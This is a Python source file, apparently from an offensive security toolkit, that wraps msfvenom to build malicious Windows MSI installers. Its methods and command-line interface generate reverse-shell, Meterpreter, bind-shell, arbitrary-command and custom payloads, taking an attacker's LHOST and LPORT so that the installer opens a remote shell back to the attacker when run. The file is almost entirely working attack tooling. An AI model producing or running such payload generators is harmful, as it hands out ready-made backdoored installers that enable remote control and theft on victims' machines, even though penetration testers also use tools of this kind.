import os
import subprocess
from typing import Optional, List
from pathlib import Path
from datetime import datetime

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import AIEExploitBase


class MsfvenomPayload(AIEExploitBase):
    """Generate malicious MSI payloads using msfvenom."""

    # Common payload types
    PAYLOADS = {
        'reverse_tcp': 'windows/x64/shell_reverse_tcp',
        'reverse_tcp_x86': 'windows/shell_reverse_tcp',
        'meterpreter_reverse': 'windows/x64/meterpreter/reverse_tcp',
        'meterpreter_reverse_x86': 'windows/meterpreter/reverse_tcp',
        'bind_tcp': 'windows/x64/shell_bind_tcp',
        'bind_tcp_x86': 'windows/shell_bind_tcp',
        'powershell_reverse': 'windows/x64/powershell_reverse_tcp',
        'exec': 'windows/x64/exec'
    }

    def __init__(self, output_dir: str = "msi_exploits"):
        """
        Initialize the msfvenom payload generator.

        Args:
            output_dir: Directory for storing generated payloads
        """
        super().__init__(output_dir)
        self.log("Msfvenom Payload Generator initialized", "SUCCESS")

    def check_msfvenom(self) -> bool:
        """
        Check if msfvenom is available on the system.

        Returns:
            True if available, False otherwise
        """
        result = subprocess.run(
            "which msfvenom" if os.name != 'nt' else "where msfvenom",
            shell=True,
            capture_output=True
        )

        if result.returncode == 0:
            self.log("msfvenom found", "SUCCESS")
            return True
        else:
            self.log("msfvenom not found - install Metasploit Framework", "ERROR")
            return False

    def list_payloads(self) -> None:
        """Print available payload types."""
        print("\n" + "=" * 60)
        print("AVAILABLE PAYLOADS")
        print("=" * 60)

        for name, payload in self.PAYLOADS.items():
            print(f"\n    {name}")
            print(f"        {payload}")

        print(f"\n[*] Use --payload-type <name> to select")

    def generate_reverse_shell(self, lhost: str, lport: int,
                               arch: str = "x64",
                               output_file: str = None) -> Optional[str]:
        """
        Generate a reverse shell MSI payload.

        Args:
            lhost: Attacker IP address
            lport: Attacker listening port
            arch: Architecture (x64 or x86)
            output_file: Optional output filename

        Returns:
            Path to generated MSI or None on failure
        """
        self.log(f"Generating reverse shell MSI payload...")
        self.log(f"LHOST: {lhost}")
        self.log(f"LPORT: {lport}")
        self.log(f"Architecture: {arch}")

        if not self.check_msfvenom():
            return None

        # Select payload based on architecture
        if arch == "x64":
            payload = self.PAYLOADS['reverse_tcp']
        else:
            payload = self.PAYLOADS['reverse_tcp_x86']

        # Set output file
        if not output_file:
            output_file = f"reverse_shell_{lport}.msi"

        output_path = self.output_dir / output_file

        # Build command
        cmd = (
            f'msfvenom -p {payload} '
            f'LHOST={lhost} LPORT={lport} '
            f'-f msi -o "{output_path}"'
        )

        self.log(f"Command: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)

            if output_path.exists():
                size = output_path.stat().st_size
                self.log(f"MSI generated: {output_path}", "SUCCESS")
                self.log(f"Size: {size} bytes")
                return str(output_path)
            else:
                self.log("MSI generation failed", "ERROR")
                if result.stderr:
                    self.log(f"Error: {result.stderr}", "ERROR")
                return None

        except Exception as e:
            self.log(f"Generation failed: {e}", "ERROR")
            return None

    def generate_meterpreter(self, lhost: str, lport: int,
                             arch: str = "x64",
                             output_file: str = None) -> Optional[str]:
        """
        Generate a Meterpreter MSI payload.

        Args:
            lhost: Attacker IP address
            lport: Attacker listening port
            arch: Architecture (x64 or x86)
            output_file: Optional output filename

        Returns:
            Path to generated MSI or None on failure
        """
        self.log(f"Generating Meterpreter MSI payload...")

        if not self.check_msfvenom():
            return None

        # Select payload
        if arch == "x64":
            payload = self.PAYLOADS['meterpreter_reverse']
        else:
            payload = self.PAYLOADS['meterpreter_reverse_x86']

        if not output_file:
            output_file = f"meterpreter_{lport}.msi"

        output_path = self.output_dir / output_file

        cmd = (
            f'msfvenom -p {payload} '
            f'LHOST={lhost} LPORT={lport} '
            f'-f msi -o "{output_path}"'
        )

        self.log(f"Command: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)

            if output_path.exists():
                self.log(f"Meterpreter MSI generated: {output_path}", "SUCCESS")
                return str(output_path)
            else:
                self.log("Generation failed", "ERROR")
                return None

        except Exception as e:
            self.log(f"Generation failed: {e}", "ERROR")
            return None

    def generate_exec(self, command: str,
                      output_file: str = None) -> Optional[str]:
        """
        Generate an MSI that executes a command.

        Args:
            command: Command to execute
            output_file: Optional output filename

        Returns:
            Path to generated MSI or None on failure
        """
        self.log(f"Generating command execution MSI...")
        self.log(f"Command: {command}")

        if not self.check_msfvenom():
            return None

        if not output_file:
            output_file = "exec_cmd.msi"

        output_path = self.output_dir / output_file

        cmd = (
            f'msfvenom -p {self.PAYLOADS["exec"]} '
            f'CMD=\'{command}\' '
            f'-f msi -o "{output_path}"'
        )

        self.log(f"Command: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)

            if output_path.exists():
                self.log(f"Exec MSI generated: {output_path}", "SUCCESS")
                return str(output_path)
            else:
                self.log("Generation failed", "ERROR")
                return None

        except Exception as e:
            self.log(f"Generation failed: {e}", "ERROR")
            return None

    def generate_custom(self, payload: str, options: dict,
                        output_file: str = None) -> Optional[str]:
        """
        Generate MSI with a custom msfvenom payload.

        Args:
            payload: Full msfvenom payload name
            options: Dictionary of payload options
            output_file: Optional output filename

        Returns:
            Path to generated MSI or None on failure
        """
        self.log(f"Generating custom MSI payload...")
        self.log(f"Payload: {payload}")

        if not self.check_msfvenom():
            return None

        if not output_file:
            output_file = "custom_payload.msi"

        output_path = self.output_dir / output_file

        # Build options string
        opts = ' '.join([f'{k}={v}' for k, v in options.items()])

        cmd = f'msfvenom -p {payload} {opts} -f msi -o "{output_path}"'

        self.log(f"Command: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)

            if output_path.exists():
                self.log(f"Custom MSI generated: {output_path}", "SUCCESS")
                return str(output_path)
            else:
                self.log("Generation failed", "ERROR")
                return None

        except Exception as e:
            self.log(f"Generation failed: {e}", "ERROR")
            return None


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Msfvenom MSI Payload Generator")
    parser.add_argument('--type', '-t',
                        choices=['reverse_shell', 'meterpreter', 'exec'],
                        default='reverse_shell',
                        help='Payload type')
    parser.add_argument('--lhost', type=str,
                        help='LHOST for reverse connections')
    parser.add_argument('--lport', type=int,
                        help='LPORT for reverse connections')
    parser.add_argument('--command', '-c', type=str,
                        help='Command for exec payload')
    parser.add_argument('--arch', choices=['x64', 'x86'], default='x64',
                        help='Architecture')
    parser.add_argument('--output', '-o', type=str,
                        help='Output filename')
    parser.add_argument('--list', action='store_true',
                        help='List available payloads')

    args = parser.parse_args()

    generator = MsfvenomPayload()

    if args.list:
        generator.list_payloads()

    elif args.type == 'reverse_shell':
        if not args.lhost or not args.lport:
            print("[-] --lhost and --lport required for reverse_shell")
        else:
            generator.generate_reverse_shell(
                args.lhost, args.lport, args.arch, args.output
            )

    elif args.type == 'meterpreter':
        if not args.lhost or not args.lport:
            print("[-] --lhost and --lport required for meterpreter")
        else:
            generator.generate_meterpreter(
                args.lhost, args.lport, args.arch, args.output
            )

    elif args.type == 'exec':
        if not args.command:
            print("[-] --command required for exec payload")
        else:
            generator.generate_exec(args.command, args.output)